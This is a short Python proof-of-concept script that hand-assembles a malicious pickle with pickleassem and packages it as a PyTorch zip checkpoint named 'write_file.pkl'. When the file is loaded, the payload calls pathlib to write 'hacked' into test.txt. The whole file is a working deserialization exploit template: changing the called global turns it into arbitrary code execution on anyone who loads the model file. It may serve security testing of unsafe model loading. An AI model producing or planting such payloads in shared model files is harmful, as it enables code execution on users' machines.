import io

import torch
from pickleassem import PickleAssembler
from torch.serialization import _open_zipfile_writer

if __name__ == "__main__":

    pa = PickleAssembler(proto=4)

    pa.push_global("pathlib", "Path.write_text")
    pa.push_mark()

    pa.push_global("pathlib", "Path")
    pa.push_mark()
    pa.push_short_binstring("test.txt")
    pa.build_tuple()
    pa.build_reduce()

    pa.push_short_binstring("hacked")
    pa.build_tuple()
    pa.build_reduce()

    payload = pa.assemble()

    data = io.BytesIO()
    data.write(payload)
    data.seek(0)

    data_value = data.getvalue()
    with _open_zipfile_writer("write_file.pkl") as zip_file:
        zip_file.write_record("data.pkl", data_value, len(data_value))
